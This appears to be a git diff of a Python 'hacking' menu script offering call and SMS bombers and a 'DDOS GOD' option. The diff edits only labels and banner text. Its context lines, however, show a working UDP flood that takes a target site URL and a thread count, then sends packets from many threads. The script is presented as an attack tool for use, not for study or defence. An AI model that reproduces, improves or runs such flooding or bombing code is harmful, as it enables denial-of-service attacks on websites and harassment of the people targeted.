@@ -125,7 +125,7 @@ up = input("""
         1 CREATOR SCRIPT
         2 CALL BOMBER
         3 SMS BOMBER 
-        4 DDOS GOD
+        4 DDOS/DOS GOD
         > > > > > > > > """)
 print(f"{pink} ")
 time.sleep(3.0)
@@ -260,8 +260,8 @@ elif up == "4":
 ----------------------HHHHH            AAAA   AAAA            HHHHH
 ----------------------HHHHH           AAAA     AAAA           HHHHH
 ----------------------HHHHH          AAAA       AAAA          HHHHH               AMIR REZA : GHOGHNOS BLACK
-----------------------HHHHHHHHHHHHHHAAAAHHHHHHHHHAAAAHHHHHHHHHHHHHH               SKRIPT DDOS BLACK GHOGHNOS
-----------------------HHHHHHHHHHHHHAAAAHHHHHHHHHHHAAAAHHHHHHHHHHHHH                   I LOVE YOU (SH)
+----------------------HHHHHHHHHHHHHHAAAAHHHHHHHHHAAAAHHHHHHHHHHHHHH             SKRIPT DDOS/DOS BLACK GHOGHNOS
+----------------------HHHHHHHHHHHHHAAAAHHHHHHHHHHHAAAAHHHHHHHHHHHHH                    I LOVE YOU (SH)
 ----------------------HHHHH       AAAA             AAAA       HHHHH
 ----------------------HHHHH      AAAA               AAAA      HHHHH
 ----------------------HHHHH     AAAA                 AAAA     HHHHH
@@ -278,7 +278,7 @@ elif up == "4":
 
 
     x = '\033[31m'
-    print(x,'ddos = BLACK GHOGHNOS',x)
+    print(x,'ddos/dos = BLACK GHOGHNOS',x)
     print(f'\033[39m')
     site = input("Enter your site url => ")
     thread_count = input("Enter your thread => ")
@@ -293,8 +293,8 @@ elif up == "4":
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
             print(f'\033[32m')
-            print("Packet Sent = god is ddos = BLACK GHOGHNOS")
-            print("creator DDOS = GHOGHNOS BLACK")
+            print("Packet Sent = god is DOS = BLACK GHOGHNOS")
+            print("creator DDOS/DOS = GHOGHNOS BLACK")
     for i in range(int(thread_count)):
         try:
             _thread.start_new_thread(ddos, ("Thread-" + str(i),))
